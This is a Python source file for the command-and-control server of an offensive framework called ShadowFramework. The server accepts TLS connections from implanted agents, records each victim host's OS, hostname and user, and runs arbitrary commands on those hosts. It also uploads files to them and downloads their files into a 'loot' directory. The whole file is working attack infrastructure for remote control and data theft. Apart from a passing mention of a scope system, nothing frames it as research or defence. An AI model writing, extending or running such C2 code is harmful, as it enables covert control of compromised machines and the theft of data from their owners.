"""
ShadowFramework — C2 Server
=============================
Manages encrypted sessions with deployed shadow agents.
Integrates with the framework's session manager and scope system.
"""

import os
import json
import time
import threading
import subprocess
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action
from utils.crypto_transport import SecureListener, SecureChannel, TLSCertManager

console = Console()


class C2Server:
    """
    Command & Control server for ShadowFramework.
    Accepts connections from shadow agents over TLS,
    manages sessions, dispatches commands, and collects results.
    """

    def __init__(self, host='0.0.0.0', port=4443, crypto_key=None, cert_dir='certs'):
        self.host = host
        self.port = port
        self.crypto_key = crypto_key or os.urandom(16).hex()
        self.cert_dir = cert_dir
        self.listener = None
        self.sessions = {}  # session_id -> AgentSession
        self.lock = threading.Lock()
        self._next_id = 1

    def start(self):
        """Start the C2 listener."""
        self.listener = SecureListener(
            host=self.host, 
            port=self.port, 
            crypto_key=self.crypto_key,
            cert_dir=self.cert_dir
        )
        self.listener.start(on_connect=self._handle_agent)
        log_action(f"C2 server started on {self.host}:{self.port}")
        return self.port

    def stop(self):
        """Shutdown the C2 server."""
        if self.listener:
            self.listener.stop()
        with self.lock:
            for sid, session in self.sessions.items():
                session.close()
            self.sessions.clear()
        log_action("C2 server stopped")

    def _handle_agent(self, channel, addr):
        """Handle a new agent connection."""
        try:
            # Wait for agent registration message
            msg_type, data = channel.recv_message()
            if msg_type != SecureChannel.MSG_DATA:
                return

            agent_info = json.loads(data)
            with self.lock:
                session_id = self._next_id
                self._next_id += 1
                session = AgentSession(
                    session_id=session_id,
                    channel=channel,
                    addr=addr,
                    info=agent_info
                )
                self.sessions[session_id] = session

            console.print(f"\n[bold green][+] NEW AGENT: Session #{session_id} from {addr[0]}:{addr[1]}[/bold green]")
            console.print(f"    [cyan]OS: {agent_info.get('os', '?')} | Host: {agent_info.get('hostname', '?')} | User: {agent_info.get('user', '?')}[/cyan]")
            log_action(f"New agent session #{session_id} from {addr[0]}")

            # Start heartbeat monitoring
            session.start_heartbeat()

        except Exception as e:
            console.print(f"[red][!] Agent connection error: {e}[/red]")

    def list_sessions(self):
        """List all active agent sessions."""
        with self.lock:
            if not self.sessions:
                console.print("[yellow][!] No active sessions.[/yellow]")
                return

            table = Table(title="Active C2 Sessions")
            table.add_column("ID", style="cyan", justify="right")
            table.add_column("Address", style="white")
            table.add_column("OS", style="green")
            table.add_column("Hostname", style="yellow")
            table.add_column("User", style="magenta")
            table.add_column("Status", style="green")
            table.add_column("Last Seen", style="dim")

            for sid, session in self.sessions.items():
                status = "[green]ALIVE[/green]" if session.alive else "[red]DEAD[/red]"
                table.add_row(
                    str(sid),
                    f"{session.addr[0]}:{session.addr[1]}",
                    session.info.get('os', '?'),
                    session.info.get('hostname', '?'),
                    session.info.get('user', '?'),
                    status,
                    session.last_seen_str()
                )
            console.print(table)

    def interact(self, session_id):
        """Interact with a specific agent session."""
        with self.lock:
            session = self.sessions.get(session_id)
        if not session:
            console.print(f"[red][!] Session #{session_id} not found.[/red]")
            return
        if not session.alive:
            console.print(f"[red][!] Session #{session_id} is dead.[/red]")
            return

        console.print(f"[cyan][*] Interacting with session #{session_id} ({session.addr[0]})[/cyan]")
        console.print("[dim]  Type 'background' to return, 'upload <file>' to push, 'download <path>' to pull.[/dim]")

        while True:
            try:
                cmd = input(f"shadow(agent-{session_id})> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == 'background':
                    break

                if cmd.lower().startswith('upload '):
                    filepath = cmd.split(' ', 1)[1]
                    session.upload_file(filepath)
                    continue

                if cmd.lower().startswith('download '):
                    remote_path = cmd.split(' ', 1)[1]
                    session.download_file(remote_path)
                    continue

                # Send command and wait for response
                result = session.execute(cmd)
                if result:
                    console.print(result)

            except KeyboardInterrupt:
                console.print()
                break
            except Exception as e:
                console.print(f"[red][!] Error: {e}[/red]")
                break

    def kill_session(self, session_id):
        """Kill an agent session."""
        with self.lock:
            session = self.sessions.pop(session_id, None)
        if session:
            session.close()
            console.print(f"[yellow][!] Session #{session_id} killed.[/yellow]")
            log_action(f"Session #{session_id} killed")
        else:
            console.print(f"[red][!] Session #{session_id} not found.[/red]")


class AgentSession:
    """Represents a single active agent session."""

    def __init__(self, session_id, channel, addr, info):
        self.session_id = session_id
        self.channel = channel
        self.addr = addr
        self.info = info
        self.alive = True
        self.last_seen = time.time()
        self._heartbeat_thread = None

    def execute(self, command, timeout=30):
        """Send a command to the agent and return the response."""
        try:
            self.channel.send_message(SecureChannel.MSG_COMMAND, command)
            msg_type, data = self.channel.recv_message()
            self.last_seen = time.time()
            if msg_type == SecureChannel.MSG_RESPONSE:
                return data.decode() if isinstance(data, bytes) else str(data)
            return None
        except Exception as e:
            self.alive = False
            return f"[Error: {e}]"

    def upload_file(self, local_path):
        """Upload a file to the agent."""
        try:
            self.channel.send_file(local_path)
            console.print(f"[green][+] Uploaded: {local_path}[/green]")
            self.last_seen = time.time()
        except Exception as e:
            console.print(f"[red][!] Upload failed: {e}[/red]")

    def download_file(self, remote_path):
        """Request a file download from the agent."""
        try:
            self.channel.send_message(SecureChannel.MSG_COMMAND, f'__download__ {remote_path}')
            output_dir = Path(f'loot/sessions/{self.session_id}')
            filepath = self.channel.recv_file(output_dir)
            console.print(f"[green][+] Downloaded: {filepath}[/green]")
            self.last_seen = time.time()
        except Exception as e:
            console.print(f"[red][!] Download failed: {e}[/red]")

    def start_heartbeat(self, interval=30):
        """Start heartbeat monitoring."""
        def _ping():
            while self.alive:
                try:
                    self.channel.send_message(SecureChannel.MSG_HEARTBEAT, b'ping')
                    msg_type, data = self.channel.recv_message()
                    if msg_type == SecureChannel.MSG_HEARTBEAT:
                        self.last_seen = time.time()
                    else:
                        self.alive = False
                except Exception:
                    self.alive = False
                    break
                time.sleep(interval)

        self._heartbeat_thread = threading.Thread(target=_ping, daemon=True)
        self._heartbeat_thread.start()

    def close(self):
        """Close the session."""
        self.alive = False
        try:
            self.channel.sock.close()
        except Exception:
            pass

    def last_seen_str(self):
        """Human-readable last seen timestamp."""
        elapsed = int(time.time() - self.last_seen)
        if elapsed < 60:
            return f"{elapsed}s ago"
        elif elapsed < 3600:
            return f"{elapsed // 60}m ago"
        return f"{elapsed // 3600}h ago"
